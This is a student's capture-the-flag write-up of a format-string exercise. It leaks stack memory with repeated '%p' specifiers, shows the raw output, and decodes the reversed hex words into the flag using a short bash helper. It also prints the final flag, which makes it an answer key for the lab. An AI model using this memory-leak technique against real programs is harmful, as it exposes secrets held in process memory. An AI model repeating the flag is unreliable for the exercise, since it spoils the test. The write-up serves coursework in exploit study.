# Exercise 3
## Jakob Udovic, s1049877

We are looking for something like:
```
HiCCTF{W0EkouRlR4fYXopWfXiowOfs9OMhyh2gFpOnrMnIMBQNiKQUSS1ELpMISaTkZP07}
```


We can put the max of 92 "%p "-s:  

```
$ ./attack.sh 92
Attackstring is 275 bytes
0x436f594465383736 0x6c78736246564b35 0x7d737a5457615239 0x7ffff7ffe490 0x7ffff7ffc63b 0x547b465443436948 0x39786e6554506955 0x326c4c4d306d507a 0x4d624c35476e5839 0x6c78736246564b35 0x503665514d433071 0x436f594465383736 0x475172716365557a 0x7d737a5457615239 0 0x7ffff7ffc63b 0x7ffff7ffe360 0 0x48 0x7fffffffeb70 0x4a6740c11727320 0x7fffffffec98 0x555555555363 0x7fffffffec30 0x55555555534c 0x1 0x116 0x7ffff7ffe360 0x4a6740c11727320 0x7fffffffec40 0x555555555371 0x1 0x7ffff7f851f5 0x7ffff7f851ce 0x7fffffffec80 0 0xf8 0x7ffff7ffdd48 0x5555555550be 0x1 0x7fffffffee80 0 0x7fffffffee8d 0x7fffffffeecf 0x7fffffffeeda 0x7fffffffef08 0x7fffffffef1c 0x7fffffffef28 0x7fffffffef2e 0x7fffffffef41 0x7fffffffef48 0x7fffffffef55 0x7fffffffef63 0x7fffffffef79 0x7fffffffef88 0x7fffffffefa5 0x7fffffffefb9 0x7fffffffefd6 0 0x21 0x7ffff7f68000 0x10 0x1f8bfbff 0x6 0x1000 0x11 0x64 0x3 0x555555554040 0x4 0x38 0x5 0xa 0x7 0x7ffff7f69000 0x8 0 0x9 0x5555555550a8 0xb 0xfffe 0xc 0xfffe 0xd 0xfffe 0xe 0xfffe 0x17 0 0x19 0x7fffffffee69 0x1a
```

We convert first n variables from:

```
436f594465383736 6c78736246564b35 7d737a5457615239 547b465443436948 39786e6554506955 326c4c4d306d507a 4d624c35476e5839 6c78736246564b35 503665514d433071 436f594465383736 475172716365557a 7d737a5457615239
```

To:  
```
CoYDe876lxsbFVK5}szTWaR9T{FTCCiH9xneTPiU2lLM0mPzMbL5GnX9lxsbFVK5P6eQMC0qCoYDe876GQrqceUz}szTWaR9
```

We can see the FTCCiH which is HiCCTF but in reverse.


Trim the stack:  
```
0x436f594465383736 0x6c78736246564b35 0x7d737a5457615239 0x7ffff7ffe490 0x7ffff7ffc63b 0x547b465443436948 0x39786e6554506955 0x326c4c4d306d507a 0x4d624c35476e5839 0x6c78736246564b35 0x503665514d433071 0x436f594465383736 0x475172716365557a 0x7d737a5457615239
```

547b465443436948  
is  
T{FTCCiH  

If we reverse it, we get:  
HiCCTF{T  

The next value would be:
39786e6554506955  
and so:  
9xneTPiU  

My educated guess is that the flag is stored the same way as in the first challenge, except in big endian form. Therefore I need to flip bytes before converting them. I would say that in the first exercise the bytes were flipped for us in the first place and therefore easier to obtain.  

I will also guess that first 3 values do not provide me with anythin interesting, therefore I will work with only the rest of the values:  

```
547b465443436948 39786e6554506955 326c4c4d306d507a 4d624c35476e5839 6c78736246564b35 503665514d433071 436f594465383736 475172716365557a 7d737a5457615239
```

And in their original form (with 0x prefix):  
```
0x547b465443436948 0x39786e6554506955 0x326c4c4d306d507a 0x4d624c35476e5839 0x6c78736246564b35 0x503665514d433071 0x436f594465383736 0x475172716365557a 0x7d737a5457615239
```

I was right. How I obtained the flag is with a simple bash script:  

```
#!/bin/bash

# hex to ascii converter online: https://www.rapidtables.com/convert/number/hex-to-ascii.html
# asii table: http://www.asciitable.com/
# looping over string array: https://stackoverflow.com/questions/8880603/loop-through-an-array-of-strings-in-bash

## declare an array variable
declare -a arr=("0x547b465443436948" "0x39786e6554506955" "0x326c4c4d306d507a" "0x4d624c35476e5839" "0x6c78736246564b35" "0x503665514d433071" "0x436f594465383736" "0x475172716365557a" "0x7d737a5457615239")
str=""

## now loop through the above array
for i in "${arr[@]}"
do
   str="${str}$(./reverseaddr $i)"
done

echo $str
```

Flag:
```
HiCCTF{TUiPTenx9zPm0MLl29XnG5LbM5KVFbsxlq0CMQe6P678eDYoCzUecqrQG9RaWTzs}
```